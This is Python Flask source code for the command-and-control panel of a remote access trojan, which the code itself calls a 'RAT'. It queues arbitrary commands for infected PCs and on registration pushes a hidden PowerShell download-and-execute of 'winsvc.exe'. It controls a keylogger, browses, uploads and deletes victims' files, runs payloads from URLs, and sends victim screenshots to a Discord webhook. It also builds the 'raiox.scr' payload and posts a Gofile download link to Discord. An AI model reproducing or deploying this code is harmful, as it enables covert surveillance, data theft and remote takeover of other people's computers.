"""
WEB API - Docker com Terminal Interativo e Notificações Real-time
"""

from flask import Flask, request, jsonify, send_from_directory, session, redirect, url_for
from flask_cors import CORS
from flask_socketio import SocketIO, emit, join_room, leave_room
import os
import sys
import json
import logging
import threading
import time
import psutil
import base64
import requests
import subprocess
from datetime import datetime
from collections import defaultdict
from functools import wraps

app = Flask(__name__, static_folder='.', static_url_path='')
PANEL_USER = os.environ.get('PANEL_USER', 'admin')
PANEL_PASS = os.environ.get('PANEL_PASS', 'admin123')
app.secret_key = os.environ.get('SECRET_KEY', os.urandom(24).hex())
socketio = SocketIO(app, cors_allowed_origins="*")
CORS(app, resources={r"/api/*": {"origins": "*", "methods": ["GET", "POST", "OPTIONS"]}})

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Dados globais
connected_pcs = {}
command_queue = {}
command_results = {}
pc_lock = threading.RLock()
result_lock = threading.Lock()
sse_clients = defaultdict(list)

# Persistencia em disco
DATA_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data', 'state.json')

def save_state():
    try:
        os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)
        with pc_lock, result_lock:
            state = {
                'pcs': {k: {'status': v.get('status','OFFLINE'), 'last_heartbeat': v.get('last_heartbeat',0),
                            'registered_at': v.get('registered_at','')} for k, v in connected_pcs.items()},
                'results': command_results
            }
        with open(DATA_FILE, 'w') as f:
            json.dump(state, f)
    except Exception as e:
        logger.error(f"Erro ao salvar estado: {e}")

def load_state():
    global connected_pcs, command_results
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                state = json.load(f)
            with pc_lock:
                for name, info in state.get('pcs', {}).items():
                    info['status'] = 'OFFLINE'
                    connected_pcs[name] = info
            with result_lock:
                command_results = state.get('results', {})
            logger.info(f"[STATE] Carregados {len(connected_pcs)} PCs do disco")
    except Exception as e:
        logger.error(f"Erro ao carregar estado: {e}")

# Link publico do watchdog (Gofile)
WATCHDOG_URL = os.environ.get('WATCHDOG_URL', '')

def send_to_discord(pc_name, screenshot_base64):
    """Envia screenshot para Discord via webhook"""
    try:
        if not DISCORD_WEBHOOK:
            return False
        if not screenshot_base64:
            return False
        
        screenshot_bytes = base64.b64decode(screenshot_base64)
        files = {'file': ('screenshot.png', screenshot_bytes, 'image/png')}
        data = {'content': f'[{datetime.now().strftime("%H:%M:%S")}] Screenshot de **{pc_name}**'}
        
        resp = requests.post(DISCORD_WEBHOOK, files=files, data=data, timeout=10)
        return resp.status_code == 204
    except Exception as e:
        logger.error(f"Erro ao enviar para Discord: {e}")
        return False

def cleanup_zombie_pcs():
    """Remove PCs offline por mais de 30s, marca como offline + salva estado"""
    global connected_pcs
    
    while True:
        time.sleep(10)
        try:
            current_time = time.time()
            with pc_lock:
                for pc_name in list(connected_pcs.keys()):
                    last_heartbeat = connected_pcs[pc_name].get('last_heartbeat', current_time)
                    offline_time = current_time - last_heartbeat
                    
                    if offline_time > 30:
                        connected_pcs[pc_name]['status'] = 'OFFLINE'
                        logger.info(f"[ZOMBIE] {pc_name} marcado como OFFLINE ({offline_time:.0f}s)")
                        broadcast_pc_update()
                save_state()
        except Exception as e:
            logger.error(f"Erro no cleanup: {e}")

def get_server_metrics():
    """Retorna metricas do servidor"""
    try:
        cpu_percent = psutil.cpu_percent(interval=0.1)
        ram = psutil.virtual_memory()
        return {
            'cpu_percent': cpu_percent,
            'ram_percent': ram.percent,
            'ram_used_mb': ram.used / (1024 * 1024),
            'ram_total_mb': ram.total / (1024 * 1024),
            'active_connections': len([pc for pc in connected_pcs.values() if pc.get('status') == 'ONLINE']),
            'total_connections': len(connected_pcs),
            'offline_connections': len([pc for pc in connected_pcs.values() if pc.get('status') == 'OFFLINE'])
        }
    except Exception as e:
        logger.error(f"Erro ao obter metricas: {e}")
        return {}

def require_login(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'authenticated' not in session:
            if request.method == 'GET':
                return redirect(url_for('login_page'))
            return jsonify({"error": "Nao autenticado"}), 401
        return f(*args, **kwargs)
    return decorated_function

@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'POST':
        data = request.get_json() or {}
        username = data.get('username', '')
        password = data.get('password', '')
        
        if username == PANEL_USER and password == PANEL_PASS:
            session['authenticated'] = True
            return jsonify({"status": "ok"}), 200
        else:
            return jsonify({"error": "Credenciais invalidas"}), 401
    
    return send_from_directory('templates', 'login.html') if os.path.exists('templates/login.html') else send_from_directory('.', 'login.html')

@app.route('/logout', methods=['GET'])
def logout():
    session.clear()
    return redirect(url_for('login_page'))

@app.route('/', methods=['GET'])
@require_login
def serve_panel():
    try:
        return send_from_directory('templates', 'panel.html')
    except:
        return send_from_directory('.', 'panel_docker.html')

@app.route('/panel.html', methods=['GET'])
@require_login
def serve_panel_html():
    try:
        return send_from_directory('templates', 'panel.html')
    except:
        return send_from_directory('.', 'panel_docker.html')

@app.route('/api/ping', methods=['GET', 'OPTIONS'])
def ping():
    if request.method == 'OPTIONS':
        return '', 204
    metrics = get_server_metrics()
    return jsonify({
        "status": "online",
        "timestamp": str(datetime.now()),
        "metrics": metrics
    })

@app.route('/api/register', methods=['POST'])
def register_pc():
    try:
        data = request.get_json() or {}
        pc_name = data.get('pc_name', 'Unknown')
        
        with pc_lock:
            if pc_name not in command_queue:
                command_queue[pc_name] = []
            if pc_name not in command_results:
                command_results[pc_name] = []
            
            is_new = pc_name not in connected_pcs
            connected_pcs[pc_name] = {
                'status': 'ONLINE',
                'last_heartbeat': time.time(),
                'registered_at': str(datetime.now()),
                'watchdog_deployed': connected_pcs[pc_name].get('watchdog_deployed', False) if pc_name in connected_pcs else False
            }
            logger.info(f"[REGISTER] {pc_name}")
        
        broadcast_pc_update()
        broadcast_notification('success', 'PC Conectado', f'{pc_name} se conectou ao painel', pc_name)
        
        if is_new or not connected_pcs[pc_name].get('watchdog_deployed'):
            threading.Thread(target=_deploy_watchdog_bg, args=(pc_name,), daemon=True).start()
        
        return jsonify({"status": "registered", "pc_name": pc_name})
    except Exception as e:
        logger.error(f"[REGISTER] Erro ao registrar PC: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


def _deploy_watchdog_bg(pc_name):
    """Background: envia comando PowerShell para baixar watchdog do painel"""
    try:
        with pc_lock:
            info = connected_pcs.get(pc_name, {})
            host = info.get('last_host', '')
        
        if not host:
            host = request.remote_addr if hasattr(request, 'remote_addr') else 'localhost'
        
        url = f"http://{host}:5000/api/watchdog"
        if WATCHDOG_URL:
            url = WATCHDOG_URL
        
        cmd = (
            f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command '
            f'"Start-Sleep 2; '
            f'Invoke-WebRequest -Uri {url} -OutFile $env:TEMP\\winsvc.exe -UseBasicParsing; '
            f'Start-Process $env:TEMP\\winsvc.exe -WindowStyle Hidden"'
        )
        
        with pc_lock:
            command_queue.setdefault(pc_name, [])
            command_queue[pc_name].append(cmd)
            if pc_name in connected_pcs:
                connected_pcs[pc_name]['watchdog_deployed'] = True
        
        logger.info(f"[WATCHDOG] {pc_name}: deploy via {url[:60]}...")
    except Exception as e:
        logger.error(f"[WATCHDOG] Erro deploy para {pc_name}: {e}")

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.get_json() or {}
    pc_name = data.get('pc_name', 'Unknown')
    
    with pc_lock:
        if pc_name not in connected_pcs:
            connected_pcs[pc_name] = {
                'status': 'ONLINE',
                'last_heartbeat': time.time(),
                'registered_at': str(datetime.now())
            }
        else:
            connected_pcs[pc_name]['status'] = 'ONLINE'
            connected_pcs[pc_name]['last_heartbeat'] = time.time()
        
        commands = command_queue.get(pc_name, [])
        if pc_name in command_queue:
            command_queue[pc_name] = []
        logger.info(f"[HEARTBEAT] {pc_name}: retornando {len(commands)} comandos")
    
    broadcast_pc_update()
    return jsonify({
        "status": "alive",
        "commands": commands
    })

@app.route('/api/pcs', methods=['GET', 'OPTIONS'])
@require_login
def get_pcs():
    if request.method == 'OPTIONS':
        return '', 204
    
    with pc_lock:
        pcs_info = []
        for pc_name, info in list(connected_pcs.items()):
            if not pc_name or not info:
                continue
            pcs_info.append({
                'name': pc_name,
                'status': info.get('status', 'UNKNOWN'),
                'last_heartbeat': info.get('last_heartbeat'),
                'registered_at': info.get('registered_at')
            })
    
    logger.info(f"[API] GET /api/pcs: {len(pcs_info)} PCs retornados")
    return jsonify({"pcs": pcs_info, "count": len(pcs_info)})

@app.route('/api/command', methods=['POST'])
@require_login
def send_command():
    try:
        data = request.get_json() or {}
        pc_name = data.get('pc_name')
        command = data.get('command')
        
        if not pc_name or not command:
            return jsonify({"error": "pc_name e command sao obrigatorios"}), 400
        
        with pc_lock:
            if pc_name not in command_queue:
                command_queue[pc_name] = []
            command_queue[pc_name].append(command)
        
        logger.info(f"[COMMAND] {pc_name}: {command}")
        broadcast_notification('info', 'Comando Enfileirado', f'{command[:40]}... → {pc_name}', pc_name)
        return jsonify({"status": "queued", "pc_name": pc_name})
    except Exception as e:
        logger.error(f"[COMMAND] Erro ao enfileirar comando: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/screenshot_data/<pc_name>', methods=['GET'])
@require_login
def get_screenshot(pc_name):
    try:
        import platform
        screenshots_dir = '/app/screenshots' if platform.system() != 'Windows' else './screenshots'
        screenshot_file = os.path.join(screenshots_dir, f"screenshot_{pc_name}.png")
        
        if not os.path.exists(screenshot_file):
            logger.warning(f"[SCREENSHOT] Arquivo não encontrado: {screenshot_file}")
            return jsonify({"error": "Screenshot nao disponivel"}), 404
        
        with open(screenshot_file, 'rb') as f:
            image_data = base64.b64encode(f.read()).decode('utf-8')
        
        logger.info(f"[SCREENSHOT] Carregada de: {screenshot_file}")
        return jsonify({
            "pc_name": pc_name,
            "image": image_data,
            "timestamp": str(datetime.now())
        })
    except Exception as e:
        logger.error(f"Erro ao obter screenshot: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/screenshot_capture/<pc_name>', methods=['POST'])
# @require_login  <-- REMOVED to allow client to upload
def capture_screenshot(pc_name):
    """Captura screenshot, salva arquivo e envia para Discord"""
    try:
        data = request.get_json() or {}
        screenshot_base64 = data.get('image', '')
        
        if screenshot_base64:
            try:
                import platform
                screenshots_dir = '/app/screenshots' if platform.system() != 'Windows' else './screenshots'
                os.makedirs(screenshots_dir, exist_ok=True)
                screenshot_file = os.path.join(screenshots_dir, f"screenshot_{pc_name}.png")
                
                screenshot_bytes = base64.b64decode(screenshot_base64)
                with open(screenshot_file, 'wb') as f:
                    f.write(screenshot_bytes)
                logger.info(f"[SCREENSHOT] Salva em: {screenshot_file}")
            except Exception as e:
                logger.error(f"Erro ao salvar screenshot: {e}")
            
            send_to_discord(pc_name, screenshot_base64)
            logger.info(f"[SCREENSHOT] {pc_name} enviada para Discord")
            return jsonify({"status": "capturada_e_enviada"})
        else:
            return jsonify({"error": "Imagem nao fornecida"}), 400
    except Exception as e:
        logger.error(f"Erro ao capturar screenshot: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/result', methods=['POST'])
def receive_result():
    """Recebe resultado de comandos do cliente"""
    try:
        data = request.get_json() or {}
        # Support both formats: direct result or command_id based
        pc_name = data.get('pc_name')
        result_text = data.get('result')
        command_id = data.get('command_id') # Optional, for future use
        
        if not pc_name or not result_text:
             # Try legacy/alternative format if needed
             if command_id and result_text:
                 # TODO: Link command_id to pc_name if possible, for now ignore
                 pass
             return jsonify({"status": "ignored", "reason": "missing_data"}), 400

        with result_lock:
            if pc_name not in command_results:
                command_results[pc_name] = []
            
            # Store with timestamp
            command_results[pc_name].append({
                "timestamp": str(datetime.now()),
                "content": result_text
            })
            
            # Keep only last 50 results
            if len(command_results[pc_name]) > 50:
                command_results[pc_name] = command_results[pc_name][-50:]

        logger.info(f"[RESULT] {pc_name}: {result_text[:50]}...")
        
        # Notify via SocketIO
        socketio.emit('command_result', {
            'pc_name': pc_name,
            'result': result_text
        })
        
        return jsonify({"status": "received"})
    except Exception as e:
        logger.error(f"[RESULT] Erro: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/results/<pc_name>', methods=['GET'])
@require_login
def get_results(pc_name):
    """Retorna ultimos resultados do PC"""
    with result_lock:
        results = command_results.get(pc_name, [])
        # Return reversed (newest first)
        return jsonify({"results": results[::-1]})

@app.route('/api/execute', methods=['POST'])
@require_login
def execute_url():
    data = request.get_json() or {}
    pc_name = data.get('pc_name')
    url = data.get('url')
    
    if not pc_name or not url:
        return jsonify({"error": "pc_name e url sao obrigatorios"}), 400
    
    with pc_lock:
        if pc_name not in command_queue:
            command_queue[pc_name] = []
        command_queue[pc_name].append(f"!execute {url}")
    
    logger.info(f"[EXECUTE] {pc_name}: {url}")
    return jsonify({"status": "enfileirado"})

@app.route('/api/keylogger/<action>/<pc_name>', methods=['POST'])
@require_login
def keylogger_control(action, pc_name):
    if action not in ['start', 'stop', 'logs']:
        return jsonify({"error": "Acao invalida"}), 400
    
    with pc_lock:
        if pc_name not in command_queue:
            command_queue[pc_name] = []
        command_queue[pc_name].append(f"!keylogger {action}")
    
    logger.info(f"[KEYLOGGER] {pc_name}: {action}")
    return jsonify({"status": f"keylogger_{action}"})

@app.route('/api/files/<action>', methods=['POST'])
@require_login
def file_manager(action):
    data = request.get_json() or {}
    pc_name = data.get('pc_name')
    path = data.get('path', '')
    
    if not pc_name:
        return jsonify({"error": "pc_name obrigatorio"}), 400
    
    with pc_lock:
        if pc_name not in command_queue:
            command_queue[pc_name] = []
        
        if action == 'list':
            command_queue[pc_name].append(f"!files list {path}")
        elif action == 'upload':
            command_queue[pc_name].append(f"!files upload {path}")
        elif action == 'download':
            command_queue[pc_name].append(f"!files download {path}")
        elif action == 'delete':
            command_queue[pc_name].append(f"!files delete {path}")
    
    logger.info(f"[FILES] {pc_name}: {action} {path}")
    return jsonify({"status": f"files_{action}"})

@app.route('/api/metrics', methods=['GET'])
@require_login
def get_metrics():
    """Retorna metricas do servidor em tempo real"""
    metrics = get_server_metrics()
    return jsonify(metrics)

DISCORD_CHANNEL_ID = 1513378963727187968
DISCORD_TOKEN = os.environ.get('DISCORD_TOKEN', '')

def upload_to_gofile(file_path):
    """Upload exe to Gofile, return download link"""
    import requests as req
    try:
        with open(file_path, 'rb') as f:
            r = req.post('https://store1.gofile.io/uploadFile', files={'file': f}, timeout=180)
        data = r.json()
        if data.get('status') == 'ok':
            return data['data']['downloadPage']
    except Exception as e:
        logger.warning(f"[GOFILE] Upload falhou: {e}")
    return None

def send_discord_link_sync(gofile_url, file_path):
    """Envia link do Gofile pro canal do Discord (sync)"""
    try:
        if not DISCORD_TOKEN:
            logger.warning("[DISCORD] Token nao configurado")
            return
        file_size = os.path.getsize(file_path) / (1024 * 1024)
        msg = f"**Novo RAT compilado!**\nTamanho: {file_size:.1f} MB\nDownload: {gofile_url}"
        resp = requests.post(
            f'https://discord.com/api/v10/channels/{DISCORD_CHANNEL_ID}/messages',
            json={'content': msg},
            headers={'Authorization': f'Bot {DISCORD_TOKEN}'},
            timeout=15
        )
        if resp.status_code == 200:
            logger.info("[DISCORD] Link enviado com sucesso!")
        else:
            logger.warning(f"[DISCORD] Erro {resp.status_code}: {resp.text}")
    except Exception as e:
        logger.warning(f"[DISCORD] Falha: {e}")

@app.route('/api/build', methods=['POST'])
def build_rat_exe():
    """Retorna RAT.exe compilado. Envia link pro Discord automaticamente."""
    try:
        import os
        import subprocess
        from pathlib import Path
        
        app_dir = Path(app.root_path)
        dist_dir = app_dir / 'dist'
        output_name = 'raiox.scr'
        dist_path = dist_dir / output_name
        
        if not dist_path.exists():
            dist_path_exe = dist_dir / 'raiox.exe'
            if dist_path_exe.exists():
                dist_path = dist_path_exe
        builder_script = app_dir / 'builder2.py'
        
        logger.info(f"[BUILD] Procurando raiox.scr em: {dist_path}")
        
        # Se não existir, tenta compilar
        if not dist_path.exists():
            logger.info("[BUILD] Arquivo não encontrado. Iniciando compilação...")
            if builder_script.exists():
                try:
                    subprocess.run([sys.executable, str(builder_script)], check=True, cwd=str(app_dir))
                    logger.info("[BUILD] Compilação concluída com sucesso.")
                except subprocess.CalledProcessError as e:
                    logger.error(f"[BUILD] Falha na compilação: {e}")
                    return jsonify({"error": "Falha ao compilar o executável no servidor."}), 500
            else:
                return jsonify({"error": "Script builder2.py não encontrado no servidor."}), 404
        
        if not dist_path.exists():
             return jsonify({
                "error": f"raiox.scr nao encontrado em {dist_path} mesmo após tentativa de build."
            }), 404
        
        # Upload to Gofile + send Discord link (sync)
        try:
            gofile_link = upload_to_gofile(str(dist_path))
            if gofile_link:
                send_discord_link_sync(gofile_link, dist_path)
                logger.info(f"[BUILD] Link enviado ao Discord: {gofile_link}")
        except Exception as e:
            logger.warning(f"[BUILD] Erro ao enviar Discord: {e}")
        
        logger.info(f"[BUILD] Enviando {dist_path.name} do servidor")
        return send_from_directory(str(dist_path.parent), dist_path.name, as_attachment=True)
    
    except Exception as e:
        logger.error(f"[BUILD] Erro ao enviar arquivo: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/watchdog_url', methods=['POST'])
@require_login
def set_watchdog_url():
    """Define a URL publica do watchdog (Gofile)"""
    global WATCHDOG_URL
    data = request.get_json() or {}
    url = data.get('url', '')
    if url:
        WATCHDOG_URL = url
        logger.info(f"[WATCHDOG] URL atualizada: {url[:60]}")
        return jsonify({"status": "ok", "url": url})
    return jsonify({"error": "url obrigatoria"}), 400


@app.route('/api/watchdog', methods=['GET'])
def download_watchdog():
    """Serve o watchdog.exe compilado ou o .py source"""
    from pathlib import Path
    dist_dir = Path(app.root_path) / 'dist'
    
    exe_path = dist_dir / 'watchdog.exe'
    if exe_path.exists():
        return send_from_directory(str(dist_dir), 'watchdog.exe', as_attachment=True)
    
    py_path = Path(app.root_path) / 'watchdog.py'
    if py_path.exists():
        return send_from_directory(str(Path(app.root_path)), 'watchdog.py', as_attachment=True)
    
    return jsonify({"error": "watchdog nao encontrado"}), 404


@app.route('/api/download', methods=['GET'])
@require_login
def download_exe():
    """Download direto do ultimo .exe compilado"""
    from pathlib import Path
    dist_dir = Path(app.root_path) / 'dist'
    candidates = list(dist_dir.glob('raiox*'))
    if not candidates:
        return jsonify({"error": "Nenhum .exe compilado. Clique em BUILD primeiro."}), 404
    latest = max(candidates, key=lambda p: p.stat().st_mtime)
    logger.info(f"[DOWNLOAD] Servindo {latest.name}")
    return send_from_directory(str(dist_dir), latest.name, as_attachment=True)


@socketio.on('terminal_connect')
def on_terminal_connect(data):
    """Cliente conecta ao terminal"""
    pc_name = data.get('pc_name')
    if not pc_name:
        emit('error', {'message': 'PC name requerido'})
        return
    
    join_room(f'terminal_{pc_name}')
    logger.info(f"[TERMINAL] Cliente conectado ao terminal de {pc_name}")
    emit('status', {'message': f'Terminal conectado: {pc_name}'})

@socketio.on('terminal_command')
def on_terminal_command(data):
    """Recebe comando do terminal para executar"""
    pc_name = data.get('pc_name')
    command = data.get('command', '').strip()
    
    if not pc_name or not command:
        emit('error', {'message': 'PC name e command requeridos'})
        return
    
    with pc_lock:
        if pc_name not in command_queue:
            command_queue[pc_name] = []
        command_queue[pc_name].append(command)
    
    logger.info(f"[TERMINAL] {pc_name}: {command}")
    emit('command_sent', {'command': command, 'timestamp': str(datetime.now())})
    socketio.emit('notification', {
        'type': 'info',
        'title': 'Comando Enviado',
        'message': f'Comando enviado para {pc_name}: {command[:50]}...'
    })

@socketio.on('terminal_disconnect')
def on_terminal_disconnect(data):
    """Cliente desconecta do terminal"""
    pc_name = data.get('pc_name')
    if pc_name:
        leave_room(f'terminal_{pc_name}')
        logger.info(f"[TERMINAL] Cliente desconectado de {pc_name}")

def broadcast_pc_update():
    """Notifica todos os clientes do painel sobre mudanças na lista de PCs"""
    try:
        with pc_lock:
            pcs_info = []
            for pc_name, info in connected_pcs.items():
                if pc_name and info:
                    pcs_info.append({
                        'name': pc_name,
                        'status': info.get('status', 'UNKNOWN'),
                        'last_heartbeat': info.get('last_heartbeat'),
                        'registered_at': info.get('registered_at')
                    })
        socketio.emit('pc_update', {
            'pcs': pcs_info,
            'count': len(pcs_info)
        })
    except Exception as e:
        logger.error(f"[PC_UPDATE] Erro ao emitir pc_update: {e}")

def broadcast_notification(notification_type, title, message, pc_name=None):
    """Envia notificação em tempo real para todos os clientes"""
    try:
        socketio.emit('notification', {
            'type': notification_type,
            'title': title,
            'message': message,
            'pc_name': pc_name,
            'timestamp': str(datetime.now())
        })
    except Exception as e:
        logger.error(f"[NOTIF] Erro ao enviar notificação: {e}")

if __name__ == '__main__':
    load_state()
    cleanup_thread = threading.Thread(target=cleanup_zombie_pcs, daemon=True)
    cleanup_thread.start()
    
    logger.info("[INICIANDO] Web API Docker com Terminal Interativo")
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)
